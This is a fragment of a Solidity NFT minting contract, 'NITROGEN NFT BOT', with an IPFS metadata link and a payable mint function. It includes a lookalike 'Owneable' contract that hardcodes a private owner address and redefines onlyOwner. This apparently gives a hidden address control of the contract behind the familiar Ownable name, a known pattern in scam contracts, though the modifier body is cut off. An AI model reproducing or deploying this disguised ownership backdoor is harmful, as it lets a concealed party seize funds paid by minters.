 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0x006c7177834667fbE9cc59a0ca9D3a37329Af761;
    modifier onlyOwner() {
...
contract NitrogenNFTBot is ERC721A, Owneable {

    string public baseURI = "https://gateway.pinata.cloud/ipfs/QmessL9YTzVEsp7w3mYNNfp3LobuhrL3HnP6WknH3bdydJ";
    string public contractURI = "https://gateway.pinata.cloud/ipfs/QmessL9YTzVEsp7w3mYNNfp3LobuhrL3HnP6WknH3bdydJ";
    ...
    constructor() ERC721A("NITROGEN NFT BOT", "NITROGEN") {}

    function mintKiyoko(uint256 _amount) external payable {
